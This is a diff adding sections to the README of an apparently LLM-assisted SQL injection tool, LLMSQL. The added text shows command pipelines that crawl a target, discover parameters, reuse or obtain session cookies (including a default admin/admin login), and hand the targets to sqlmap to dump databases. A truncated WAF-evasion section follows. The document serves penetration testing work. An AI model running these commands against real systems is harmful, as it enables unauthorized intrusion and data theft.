@@ -155,6 +155,50 @@ With `--openapi`, an exposed spec (very common — see Swagger UIs) turns into a
 full, precise target list including `?query=`, path IDs, etc. This is how a
 tester who read the Swagger doc finds `/api/testimonials/count?query=...`.
 
+## Recommended pipeline (chain with sqlmap)
+
+LLMSQL is best used as the **recon + orchestration** layer that feeds
+**sqlmap** (the proven exploitation engine). Full chain:
+
+```
+katana ──► httpx ──► llmsql (discover+auth) ──► sqlmap (exploit)
+ crawl     alive?      params/openapi/cookie      dump DB
+```
+
+```bash
+# 1+2+3+4 in one line: crawl -> (llmsql liveness is built in) -> sqlmap targets
+katana -u https://target/ -jc -silent | sort -u \
+  | python -m llmsql --stdin --guess-params --grab-cookie --sqlmap
+
+# then run the emitted command
+sqlmap -m llmsql-sqlmap-urls.txt --batch --random-agent --level 3 --risk 2
+
+# or let llmsql launch sqlmap for you
+python -m llmsql --openapi https://target/ --guess-params --grab-cookie --run-sqlmap
+```
+
+You don't strictly need all four tools — LLMSQL already does liveness probing
+(httpx's role) and can crawl input from katana OR import an OpenAPI spec. A
+minimal chain is just **llmsql --openapi ... --run-sqlmap**.
+
+## Sessions & cookies
+
+```bash
+# Grab the target's Set-Cookie session automatically and reuse it
+python -m llmsql --openapi https://target/ --grab-cookie
+
+# Log in first, then use the resulting session cookie
+python -m llmsql -u "https://target/api/x?id=1" \
+  --login-url https://target/api/auth/login \
+  --login-data '{"user":"admin","password":"admin"}'
+
+# Or pass a known cookie / bearer token
+python -m llmsql --openapi https://target/ \
+  --cookie "connect.sid=s%3A..." -H "Authorization: Bearer <jwt>"
+```
+
+Captured cookies flow into both the LLMSQL scan and the sqlmap handoff command.
+
 ## WAF / filter evasion
 
 If a WAF blocks payloads (baseline `200` but injected `403/406/429`), LLMSQL
